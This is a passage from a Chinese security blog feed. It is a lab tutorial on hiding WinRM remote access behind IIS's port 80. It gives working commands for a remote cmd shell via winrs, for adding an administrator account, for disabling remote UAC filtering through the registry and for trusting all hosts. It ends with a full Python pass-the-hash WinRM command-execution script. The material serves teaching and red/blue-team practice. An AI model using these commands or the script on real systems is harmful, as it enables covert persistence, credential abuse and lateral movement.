title="端口复用"></a>端口复用</h4><p>开启IIS服务&#x2F;WEB服务</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071845655.png" data-fancybox="true"/></div></div><p>先看一下当前注册的url前缀:<code>netsh http show servicestate</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071846105.png" data-fancybox="true"/></div></div><p>启动winrm:<code>winrm quickconfig -q</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071848831.png" data-fancybox="true"/></div></div><p>再看一下注册的url前缀，发现winrm已注册:</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071849128.png" data-fancybox="true"/></div></div><p>看一下端口情况:<code>netstat -ano</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071849044.png" data-fancybox="true"/></div></div><p>增加80端口复用:<code>winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071851100.png" data-fancybox="true"/></div></div><p>更改winrm为80端口:<code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071851745.png" data-fancybox="true"/></div></div><p>再看一下端口情况，发现5985端口已关闭:</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071852277.png" data-fancybox="true"/></div></div><ul><li>Attacker：Windows Server 2008 R2 x64</li></ul><p>启动winrm<code>winrm quickconfig -q</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071900920.png" data-fancybox="true"/></div></div><p>设置信任主机地址:<br><code>winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071906842.png" data-fancybox="true"/></div></div><p>使用winrs远程执行命令:<code>winrs -r:http://192.168.232.135 -u:administrator -p:1qaz@WSX whoami</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071906244.png" data-fancybox="true"/></div></div><p>执行cmd命令可获取交互式shell:<code>winrs -r:http://192.168.232.135 -u:administrator -p:1qaz@WSX cmd</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071907161.png" data-fancybox="true"/></div></div><p>此时IIS的正常服务并未受到影响:</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071907843.png" data-fancybox="true"/></div></div><h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><blockquote><p>如果远程计算机上的帐户具有相同登录用户名和密码，则所需的唯一额外信息是传输、域名和计算机名称。 由于 <a href="https://support.microsoft.com/help/922708/how-to-use-user-account-control-uac-in-windows-vista">用户帐户控制 (UAC) </a>，远程帐户必须是域帐户和远程计算机管理员组的成员。 如果帐户是管理员组的本地计算机成员，则 UAC 不允许访问 WinRM 服务。 若要访问工作组中的远程 WinRM 服务，必须通过创建以下 DWORD 注册表项并将其值设置为 1： <strong>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System] LocalAccountTokenFilterPolicy</strong> 来禁用本地帐户的 UAC 筛选</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net user <span class="built_in">test</span> password@123 /add</span><br><span class="line">net localgroup administrators <span class="built_in">test</span> /add</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除,因为无法直接修改</span></span><br><span class="line">reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /f</span><br><span class="line"><span class="comment"># 添加注册表</span></span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/Client @&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line">winrm e winrm/config/listener</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211071953256.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211072010961.png" data-fancybox="true"/></div></div><p>修改后，普通管理员登录后也是高权限</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211072010177.png" data-fancybox="true"/></div></div><h4 id="Hash登录-来自网络"><a href="#Hash登录-来自网络" class="headerlink" title="Hash登录(来自网络)"></a>Hash登录(来自网络)</h4><p>使用本地的winrs登录，虽然非常方便，但是Windows Server 2012以后我们抓取明文密码有些许复杂，多数情况下只能抓到账户的Hash，这个时候如果用winrs就无法正常登录了。此时，我们就可以借助python脚本，用<strong>NTLM hash</strong>执行命令了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> winrm</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getURLState</span>(<span class="params">url</span>):</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]404 Not Found!&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> r.status_code == <span class="number">403</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]403 Forbidden!&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]500 Internal Server Error!&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]200 OK!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;HTTP Status Code：&quot;</span>+<span class="built_in">str</span>(r.status_code))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">splitURL</span>(<span class="params">url</span>):</span><br><span class="line">    parser = urllib.parse.urlparse(url)</span><br><span class="line">    path = parser.path</span><br><span class="line">    ip = parser.netloc</span><br><span class="line">    port = parser.port</span><br><span class="line">    <span class="keyword">return</span> path,ip,port</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parseFlag</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;WinRm Port Reuse (Only Windows Server &gt;= 2012)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-r&quot;</span>,action=<span class="string">&#x27;store&#x27;</span>,dest=<span class="string">&#x27;url&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;Remote URL&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>,action=<span class="string">&#x27;store&#x27;</span>,dest=<span class="string">&#x27;user&#x27;</span>,default=<span class="string">&quot;administrator&quot;</span>,<span class="built_in">help</span>=<span class="string">&#x27;WinRM username&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>,metavar=<span class="string">&quot;&quot;</span>,dest=<span class="string">&#x27;pwd&#x27;</span>,<span class="built_in">help</span>=<span class="string">&quot;WinRM password&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-H&quot;</span>,action=<span class="string">&#x27;store&#x27;</span>,dest=<span class="string">&#x27;hpwd&#x27;</span>,<span class="built_in">help</span>=<span class="string">&quot;NTLM-Hash password&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>,action=<span class="string">&#x27;store&#x27;</span>,dest=<span class="string">&#x27;cmd&#x27;</span>,default=<span class="string">&quot;whoami&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;cmd shell&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attackWinRM</span>(<span class="params">path,ip,port,cmd,**shell</span>):</span><br><span class="line">    <span class="keyword">if</span> shell.get(<span class="string">&quot;hpwd&quot;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            wincmd = winrm.Session(<span class="string">&#x27;http://&#x27;</span> + ip + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port) + path,</span><br><span class="line">                                   auth=(shell.get(<span class="string">&quot;user&quot;</span>), <span class="string">&#x27;00000000000000000000000000000000:&#x27;</span> + shell.get(<span class="string">&quot;hpwd&quot;</span>)),</span><br><span class="line">                                   transport=<span class="string">&quot;ntlm&quot;</span>, server_cert_validation=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            result = wincmd.run_cmd(<span class="built_in">str</span>(cmd))</span><br><span class="line">            sys.stdout.write(result.std_out.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">            sys.stdout.write(result.std_err.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-]Hash Assword Error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            wincmd = winrm.Session(<span class="string">&#x27;http://&#x27;</span> + ip + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port) + path,</span><br><span class="line">                                   auth=(shell.get(<span class="string">&quot;user&quot;</span>), shell.get(<span class="string">&quot;pwd&quot;</span>)),</span><br><span class="line">                                   transport=<span class="string">&quot;basic&quot;</span>, server_cert_validation=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            result = wincmd.run_cmd(<span class="built_in">str</span>(cmd))</span><br><span class="line">            sys.stdout.write(result.std_out.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">            sys.stdout.write(result.std_err.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-]Password Error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Main</span>():</span><br><span class="line">    args = parseFlag()</span><br><span class="line">    getURLState(args.url)</span><br><span class="line">    path, ip, port = splitURL(args.url)</span><br><span class="line">    attackWinRM(path,ip,port,args.cmd, user=args.user, hpwd=args.hpwd, pwd=args.pwd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Main()</span><br></pre></td></tr></table></figure><p>使用此脚本用明文密码登录时，需要为WinRM service 配置auth：<br><code>winrm set winrm/config/service/auth @&#123;Basic=&quot;true&quot;&#125;</code><br>还要为WinRM service配置加密方式为允许非加密：<br><code>winrm set winrm/config/service @&#123;AllowUnencrypted=&quot;true&quot;&#125;</code><br>用Hash登录时，需使用NTLM Hash。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;tag-plugin grid&quot; bg=&quot;card&quot; style=&quot;grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));&quot;&gt;&lt;div class=&quot;cell&quot; style=&quot;&quot;&gt;
   </summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://axusun01.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    <category term="蓝队" scheme="https://axusun01.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E8%93%9D%E9%98%9F/"/>
    
    
    <category term="蓝队" scheme="https://axusun01.github.io/tags/%E8%93%9D%E9%98%9F/"/>
    
    <category term="攻防演练" scheme="https://axusun01.github.io/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="事件研判" scheme="https://axusun01.github.io/tags/%E4%BA%8B%E4%BB%B6%E7%A0%94%E5%88%A4/"/>
    
    <category term="应急响应" scheme="https://axusun01.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="安全运营" scheme="https://axusun01.github.io/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
</feed>
